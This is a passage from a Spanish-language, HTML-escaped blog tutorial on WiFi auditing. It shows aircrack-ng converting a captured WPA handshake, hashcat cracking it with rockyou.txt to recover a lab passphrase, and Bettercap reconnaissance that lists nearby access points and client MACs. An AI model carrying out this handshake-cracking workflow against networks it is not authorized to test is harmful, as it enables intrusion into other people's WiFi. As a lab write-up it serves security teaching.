01:00.0 VGA compatible controller &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0300]: NVIDIA Corporation GP107M &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;GeForce GTX 1050 Mobile] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10de:1c8d] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rev a1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lo mejor es tirar de &lt;strong&gt;Hashcat&lt;/strong&gt; para estos casos. Para correr la herramienta, primero necesitamos saber cuál
es el método numérico correspondiente a &lt;strong&gt;WPA&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#hashcat -h | grep -i wpa&lt;/span&gt;
   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols
   2501 | WPA-EAPOL-PMK                                    | Network Protocols
  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols
  16801 | WPA-PMKID-PMK                                    | Network Protocols
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez identificado (&lt;strong&gt;2500&lt;/strong&gt;), lo primero que necesitamos hacer es convertir nuestra captura ‘&lt;strong&gt;.cap&lt;/strong&gt;’ a un
archivo de tipo ‘&lt;strong&gt;.hccapx&lt;/strong&gt;’, específico para la combinación de Hashcat. Para ello, corremos el parámetro
‘&lt;strong&gt;-j&lt;/strong&gt;’ de aircrack (esta vez es minúscula):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#aircrack-ng -j hashcatCapture Captura-01.cap &lt;/span&gt;
Opening Captura-01.cape wait...
Read 5110 packets.

   &lt;span class=&quot;c&quot;&gt;#  BSSID              ESSID                     Encryption&lt;/span&gt;

   1  20:34:FB:B1:C5:53  hacklab                   WPA &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 handshake&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Choosing first network as target.

Opening Captura-01.cape wait...
Read 5110 packets.

1 potential targets



Building Hashcat &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.60+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; file...

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ESSID &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;length: 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: hacklab
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Key version: 2
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; BSSID: 20:34:FB:B1:C5:53
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; STA: 34:41:5D:46:D1:38
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; anonce:
    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A 
    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; snonce:
    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F 
    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Key MIC:
    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 
    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE 
    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 00 00 

Successfully written to hashcatCapture.hccapx

┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ls&lt;/span&gt;
Captura-01.cap  hashcatCapture.hccapx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya en posesión de esta captura, iniciamos la fase de cracking haciendo uso de la siguiente sintaxis:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;hashcat -m 2500 -d 1 rockyou.txt –force -w 3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Obteniendo los siguientes resultados en un tiempo récord:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@parrot]─[/usr/share/wordlists]
└──╼ &lt;span class=&quot;c&quot;&gt;#hashcat -m 2500 -d 1 hashcatCapture.hccapx rockyou.txt &lt;/span&gt;
hashcat &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting...

OpenCL Platform &lt;span class=&quot;c&quot;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;======================================&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#1: GeForce GTX 1050, 1010/4040 MB allocatable, 5MCU&lt;/span&gt;

OpenCL Platform &lt;span class=&quot;c&quot;&gt;#2: The pocl project&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;====================================&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#2: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.&lt;/span&gt;

Hashes: 1 digests&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Zero-Byte
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Single-Hash
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Single-Salt
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Slow-Hash-SIMD-LOOP

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Watchdog: Temperature abort trigger &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;to 90c

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=2500 -D _unroll'&lt;/span&gt;
Dictionary cache hit:
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Filename..: rockyou.txt
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Passwords.: 14344386
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Bytes.....: 139921517
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Keyspace..: 14344386

ebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: WPA-EAPOL-PBKDF2
Hash.Target......: hacklab &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;AP:20:34:fb:b1:c5:53 STA:34:41:5d:46:d1:38&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Time.Started.....: Sun Aug 11 19:12:43 2019 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Time.Estimated...: Sun Aug 11 19:12:47 2019 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rockyou.txt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Speed.#1.........:    79177 H/s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7.18ms&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; @ Accel:128 Loops:64 Thr:64 Vec:1
Recovered........: 1/1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Salts
Progress.........: 807901/14344386 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.63%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Rejected.........: 439261/807901 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;54.37%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Point....: 728207/14344386 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.08%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 22lehvez33 -&amp;gt; rodnesha
Hardware.Mon.#1..: Temp: 63c Util: 92% Core:1670MHz Mem:3504MHz Bus:8

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Recuerda hacer uso del parámetro &lt;strong&gt;-d&lt;/strong&gt; para especificar el dispositivo a usar. Si queremos listar la
contraseña una vez crackeada (aunque también la vemos en el output listado anteriormente), podemos hacer lo
siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/usr/share/wordlists]
└──╼ &lt;span class=&quot;c&quot;&gt;#hashcat --show -m 2500 hashcatCapture.hccapx &lt;/span&gt;
ebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En este caso, para los curiosos, haciendo uso de una &lt;strong&gt;GeForce GTX 1050&lt;/strong&gt; estaríamos yendo a 79.177 Hashes por
segundo, lo cual hace que en cuestión de segundos nos podamos recorrer todo el rockyou entero.&lt;/p&gt;

&lt;h4 id=&quot;proceso-de-ataque-con-bettercap&quot;&gt;Proceso de ataque con Bettercap&lt;/h4&gt;

&lt;p&gt;Todo el proceso llevado a cabo hasta ahora, puede ser realizado desde &lt;strong&gt;Bettercap&lt;/strong&gt;. Sí que es cierto que
aunque para el caso visto prefiero tirar del método convencional, en ocasiones uso &lt;strong&gt;Bettercap&lt;/strong&gt; para los
ataques de PKMID que explicaré más adelante, para redes WPA/WPA2 sin clientes.&lt;/p&gt;

&lt;p&gt;Lo primero de todo para llevar a cabo el procedimiento, es poner nuestra tarjeta de red en modo monitor tal y
como se detalló en los puntos anteriormente vistos. Posteriormente, desde &lt;strong&gt;Bettercap&lt;/strong&gt;, podemos hacer lo
siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/opt/bettercap]
└──╼ &lt;span class=&quot;c&quot;&gt;#./bettercap -iface wlan0mon&lt;/span&gt;
bettercap v2.24.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;built &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;linux amd64 with go1.10.4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a list of commands]

 wlan0mon  » wifi.recon on
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi using interface wlan0mon &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e4:70:b8:d3:93:5c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi started &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;min rssi: &lt;span class=&quot;nt&quot;&gt;-200&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi channel hopper started.
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point MOVISTAR_49BA &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-92&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 84:aa:9c:f1:49:bc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;MitraStar Technology Corp.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point MOVISTAR_2F95 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-93&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as e8:d1:1b:21:2f:96 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Askey Computer Corp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point LowiF7D3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-84&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 10:62:d0:f6:f7:d8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Technicolor CH USA Inc.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point MOVISTAR_A908 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-90&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as &lt;span class=&quot;nb&quot;&gt;fc&lt;/span&gt;:b4:e6:99:a9:09 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Askey Computer Corp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point devolo-30d32d583e03 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-96&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 30:d3:2d:58:3e:03 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;devolo AG&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:24] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-54&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 1c:b0:44:d4:16:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Askey Computer Corp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:24] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point MIWIFI_psGP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-94&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 50:78:b3:ee:bb:ac.
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:25] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point Wlan1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-81&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as f8:8e:85:df:3e:13 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Comtrend Corporation&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:27] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point linksys &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-73&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 00:12:17:70:d5:2c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Cisco-Linksys, LLC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:27] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point devolo-30d32d583c6b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-82&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 30:d3:2d:58:3c:6b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;devolo AG&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:27] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.new] new station 78:4f:43:24:01:4e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Apple, Inc.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;linksys &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;00:12:17:70:d5:2c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:27] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point MOVISTAR_3126 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-93&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as cc:d4:a1:0c:31:28 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;MitraStar Technology Corp.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:27] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point vodafone4038 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-92&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 28:9e:fc:0c:40:3e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Sagemcom Broadband SAS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:07:27] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.new] new station f0:7b:cb:04:d7:37 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Hon Hai Precision Ind. Co.,Ltd.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;linksys &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;00:12:17:70:d5:2c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Es decir, a través del comando &lt;strong&gt;wifi.recon on&lt;/strong&gt;, monitorizamos las redes disponibles del entorno, tal y como
lo haríamos desde &lt;strong&gt;airodump&lt;/strong&gt;. Una vez hecho, por comodidad, filtramos los resultados por el número de
clientes/estaciones disponibles para los distintos AP’s:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; wlan0mon  » &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;wifi.show.sort clients desc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Por último, a través de la utilidad &lt;strong&gt;ticker&lt;/strong&gt;, podemos especificar los comandos que queramos que se ejecuten
 a intervalos regulares de tiempo. En mi caso, especificaré que quiero hacer una limpieza de pantalla seguido
 de la operación &lt;strong&gt;wifi.show&lt;/strong&gt;, que se encargará de listarme los puntos de acceso disponibles en el entorno en
base al criterio de filtrado a nivel de clientes que especifiqué en la operación anterior:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; wlan0mon  » &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;ticker.commands &lt;span class=&quot;s1&quot;&gt;'clear; wifi.show'&lt;/span&gt;
 wlan0mon  » ticker on
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez presionemos la tecla ‘Enter’, obtendremos unos resultados como estos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─────────┬───────────────────┬─────────────────────┬──────────────────┬──────────────────────┬─────┬───────────┬────────┬───────┬──────────┐
│  RSSI   │       BSSID       │        SSID         │    Encryption    │         WPS          │ Ch  │ Clients ▾ │  Sent  │ Recvd │   Seen   │
├─────────┼───────────────────┼─────────────────────┼──────────────────┼──────────────────────┼─────┼───────────┼────────┼───────┼──────────┤
│ &lt;span class=&quot;nt&quot;&gt;-81&lt;/span&gt; dBm │ 30:d3:2d:58:3c:6b │ devolo-30d32d583c6b │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 11  │ 1         │ 326 B  │ 84 B  │ 21:15:40 │
│ &lt;span class=&quot;nt&quot;&gt;-69&lt;/span&gt; dBm │ 1c:b0:44:d4:16:85 │ MOVISTAR_PLUS_1677  │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 112 │ 1         │ 516 B  │ 344 B │ 21:15:31 │
│ &lt;span class=&quot;nt&quot;&gt;-74&lt;/span&gt; dBm │ 00:12:17:70:d5:2c │ linksys             │ OPEN             │                      │ 11  │ 1         │ 383 kB │ 31 kB │ 21:15:40 │
│ &lt;span class=&quot;nt&quot;&gt;-95&lt;/span&gt; dBm │ &lt;span class=&quot;nb&quot;&gt;fc&lt;/span&gt;:b4:e6:99:a9:09 │ MOVISTAR_A908       │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 1   │           │        │       │ 21:15:34 │
│ &lt;span class=&quot;nt&quot;&gt;-87&lt;/span&gt; dBm │ f8:8e:85:df:3e:13 │ Wlan1               │ WPA &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TKIP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  │ 1.0                  │ 9   │           │ 7.1 kB │       │ 21:15:39 │
│ &lt;span class=&quot;nt&quot;&gt;-95&lt;/span&gt; dBm │ e8:d1:1b:21:2f:96 │ MOVISTAR_2F95       │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 1   │           │        │       │ 21:15:18 │
│ &lt;span class=&quot;nt&quot;&gt;-98&lt;/span&gt; dBm │ d0:17:c2:30:45:7c │ pepephone_ADSLR9C0  │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │                      │ 3   │           │        │       │ 21:15:19 │
│ &lt;span class=&quot;nt&quot;&gt;-95&lt;/span&gt; dBm │ cc:d4:a1:0c:31:28 │ MOVISTAR_3126       │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not configured&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 11  │           │        │       │ 21:15:39 │
│ &lt;span class=&quot;nt&quot;&gt;-97&lt;/span&gt; dBm │ a0:ab:1b:45:ad:4f │ MiFibra-FA4C-EXT    │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TKIP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 1   │           │        │       │ 21:15:01 │
│ &lt;span class=&quot;nt&quot;&gt;-90&lt;/span&gt; dBm │ 84:aa:9c:f1:49:bc │ MOVISTAR_49BA       │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 1   │           │        │       │ 21:15:35 │
